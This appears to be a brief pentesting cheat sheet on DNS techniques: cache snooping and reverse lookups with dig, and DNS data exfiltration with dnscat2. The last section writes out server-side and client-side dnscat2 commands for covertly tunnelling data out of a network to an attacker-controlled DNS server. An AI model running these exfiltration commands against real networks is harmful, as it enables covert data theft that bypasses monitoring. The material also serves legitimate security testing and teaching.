### Cache Snooping
> Technique to determine if a DNS server has specific records in its cache.
```bash
dig @<dns-server> <domain> +norecurse
```

### Reverse DNS Lookup
> Reverse DNS lookup is a DNS query for the domain name associated with a given IP address.
```bash
dig -x <ip-address>
```

### DNS Exfiltration
> Data exfiltration over DNS involves encoding data in DNS queries and responses, allowing data to be extracted from a network covertly.

```bash
# Server side
dnscat2 --dns server=<dns-server-ip>:53

# Client side
dnscat2 <domain>
```
